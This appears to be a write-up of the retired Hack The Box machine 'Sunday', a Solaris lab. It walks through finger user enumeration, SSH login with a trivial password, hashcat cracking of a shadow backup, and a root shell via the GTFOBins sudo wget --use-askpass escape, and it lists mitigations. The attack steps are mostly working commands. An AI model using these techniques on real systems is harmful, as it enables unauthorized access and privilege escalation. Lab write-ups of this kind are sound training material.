---
machine: Sunday
os: Solaris
difficulty: Easy
platform: Hack The Box
category: Services / Solaris
state: Retired
tags: [solaris, finger, ssh, shadow, hashcat, sudo, wget, gtfobins]
---

# Sunday — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Methodology notes; no flags or real credentials.

## TL;DR

Solaris with **finger** exposed: it enumerates `sunny` and `sammy`. `sunny` has a trivial password, and from that home you reach a **backup of `/etc/shadow`**; `sammy`'s hash falls to a dictionary. `sammy` may run **`wget` as root** through `sudo`, which allows writing anywhere (or GTFOBins' `--use-askpass`).

## Recon

```bash
nmap -p- -sCV <IP> -oN nmap.txt
```

```text
79/tcp    open  finger   Sun Solaris fingerd
111/tcp   open  rpcbind
22022/tcp open  ssh      SunSSH 1.3
```

```bash
finger-user-enum -U /usr/share/seclists/Usernames/Names/names.txt -t <IP>
# sammy, sunny
```

## Access

1. **`sunny`**: password is the machine name; SSH is on 22022 and needs legacy algorithms.

```bash
ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -p 22022 sunny@<IP>
```

2. **`shadow` backup** in the home: `sammy`'s hash is SHA-256 crypt (`$5$`).

```bash
hashcat -m 7400 hash.txt /usr/share/wordlists/rockyou.txt
```

3. **SSH as `sammy`** with the recovered password.

## Escalation

```bash
sudo -l
```

```text
User sunny may run the following commands on this host:
    (root) NOPASSWD: /root/troll        # prints "testing" and id: a decoy
User sammy may run the following commands on this host:
    (root) NOPASSWD: /usr/bin/wget
```

`wget` as root writes wherever asked; the clean route is the GTFOBins escape:

```bash
TF=$(mktemp)
chmod +x $TF
echo -e '#!/bin/sh\n/bin/sh 1>&0' > $TF
sudo /usr/bin/wget --use-askpass=$TF 0
```

```text
root@sunday:~# id
uid=0(root)
```

## Pitfalls

- **`/root/troll`**: prints `testing` and `id`, and a root job restores it every few seconds from `/root/troll.original`. Overwriting it inside that window runs your script as root (the race alternative to `wget`).
- **Old SSH**: without legacy `KexAlgorithms` the client refuses to connect.
- **`wget -i`**: reading `/etc/shadow` only helps if you can dump it; the useful part is **writing** (`-O`) or the `askpass` trick.

## Lessons

- `finger` leaks valid users: free enumeration.
- A `shadow` backup in a home turns one user into two.
- `sudo` on `wget` is arbitrary write as root.
- Mitigation: disable `finger`, enforce strong passwords, and never grant `sudo` on downloaders.
